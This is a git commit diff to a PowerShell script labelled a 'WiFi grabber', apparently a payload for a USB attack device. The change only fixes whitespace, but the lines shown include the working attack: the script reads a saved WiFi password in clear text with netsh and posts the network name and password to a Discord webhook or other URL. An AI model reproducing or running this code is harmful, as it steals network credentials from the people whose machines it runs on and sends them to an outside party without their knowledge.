a892f8ae38a79838f33c30b35ff147a4e1cef745
will-c0de <40558280+will-c0de@users.noreply.github.com>
2023-01-29 10:47:13 +0000

    📜Edited the WiFi grabber [v1.7]
    Fixed whitespace issue

--- assets/WiFi-Pass/WiFi-Pass.ps1
+++ assets/WiFi-Pass/WiFi-Pass.ps1
@@ -18,7 +18,7 @@ $pass = (((netsh.exe wlan show profiles name="$ssid" key=clear | select-string -
 if ($webhookUrl.Contains('discord.com/api/webhooks/')) {
   $json = @"
   {"content": null,"embeds": [{"title": "ssid: $ssid","description": "pass: $pass","color": 16753920,"author": {"name": "WiFi Recieved"},"footer": {"text": "will | @willsflipper","icon_url": "https://thumb.tildacdn.com/tild6664-3230-4633-b839-313833343662/-/resize/300x/-/format/webp/qFlipper_macOS_256px.png"}}]}
-  "@
+"@
   Invoke-WebRequest -ContentType 'Application/Json' -Uri "$webhookUrl" -Method Post -Body ($json)
 } else {
   Invoke-WebRequest -Method Post -Uri "$webhookUrl" -Body "$ssid  : $pass"
